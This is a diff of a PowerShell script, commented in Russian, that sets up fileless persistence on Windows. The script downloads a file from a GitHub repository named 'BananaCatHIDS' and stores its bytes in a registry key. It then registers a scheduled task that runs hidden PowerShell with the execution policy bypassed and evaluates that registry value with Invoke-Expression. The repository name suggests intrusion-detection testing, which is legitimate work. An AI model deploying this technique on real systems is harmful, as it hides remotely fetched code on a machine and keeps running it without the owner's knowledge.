@@ -1,18 +1,22 @@
-$script_name = BananaCat
+# Задаём переменные
+$script_name = "BananaCat"
 $reg_path = "HKCU:\Software\$script_name"
-$scriptCode = -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'Invoke-Expression (Get-ItemProperty -Path $reg_path -Name "$script_name").MyScript'
+$CAT_IMAGE_URI = "https://raw.githubusercontent.com/vanos03/BananaCatHIDS/refs/heads/main/cat.jpg"
+$IMAGE_NAME = $script_name
+$CAT_IMAGE_OUT = "$env:TEMP\$IMAGE_NAME.jpg"
 
-$IMAGE_NAME=BananaCat
-$CAT_IMAGE_OUT=%TEMP%\$IMAGE_NAME.jpg
-$CAT_IMAGE_URI=https://raw.githubusercontent.com/vanos03/BananaCatHIDS/refs/heads/main/cat.jpg
+# Команда, которая будет записана в XML
+$scriptCode = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Get-ItemProperty -Path '$reg_path' -Name '$script_name').$script_name`""
 
-Invoke-WebRequest -Uri "$CAT_IMAGE_URI" -OutFile "$CAT_IMAGE_OUT""  > nul 2>&1
+# Скачиваем изображение
+Invoke-WebRequest -Uri $CAT_IMAGE_URI -OutFile $CAT_IMAGE_OUT -ErrorAction SilentlyContinue
 
+# Генерируем XML с подстановкой переменной
 $xmlTemplate = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
-    <URI>\ïðîåêò_ðàçãðîì</URI>
+    <URI>\проект_разгром</URI>
   </RegistrationInfo>
   <Triggers>
     <EventTrigger>
@@ -52,23 +56,24 @@ $xmlTemplate = @"
     <Exec>
       <Command>powershell.exe</Command>
       <Arguments>$scriptCode</Arguments>
-      <WorkingDirectory>E:\Downloads\Ïðîåêò_ðàçãðîì</WorkingDirectory>
+      <WorkingDirectory>$env:TEMP</WorkingDirectory>
     </Exec>
   </Actions>
 </Task>
 "@
 
+# Преобразуем XML и сохраняем
 [xml]$xml = $xmlTemplate
-
 $tmpXmlPath = "$env:TEMP\task_temp.xml"
 $xml.Save($tmpXmlPath)
 
-schtasks /Create /TN "ïðîåêò_ðàçãðîì" /XML $tmpXmlPath /F
+# Создаём задачу
+schtasks /Create /TN "проект_разгром" /XML $tmpXmlPath /F
 
-Remove-Item $tmpXmlPath
+# Удаляем временный XML
+Remove-Item $tmpXmlPath -Force
 
-
+# Записываем изображение в реестр
 $bytes = [System.IO.File]::ReadAllBytes($CAT_IMAGE_OUT)
-
 New-Item -Path $reg_path -Force | Out-Null
 Set-ItemProperty -Path $reg_path -Name "$IMAGE_NAME" -Value $bytes
